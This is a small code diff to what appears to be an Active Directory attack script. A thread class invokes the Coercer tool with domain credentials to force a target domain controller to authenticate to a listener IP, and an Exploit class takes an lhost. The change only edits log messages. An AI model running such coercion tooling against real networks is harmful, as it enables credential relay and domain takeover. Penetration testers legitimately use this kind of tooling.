@@ -72,9 +72,9 @@ class Coercer(threading.Thread):
         self.listener_ip = listener_ip
         
     def run(self):
-        print(f'[+] Started Coercing {self.target_dc} to {self.listener_ip}')
+        print(f'[+] Started coercion from {self.target_dc} to {self.listener_ip}')
         subprocess.Popen(["Coercer", "coerce", "-u", self.username, "-p", self.password, "-d", self.domain, "-t", self.target_dc, "-l", self.listener_ip, "--always-continue"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
-
+        print(f'[+] Finished coercion from {self.target_dc} to {self.listener_ip}')
         
 class Exploit:
     def __init__(self, domain, username, password, target, level, lhost) -> None:
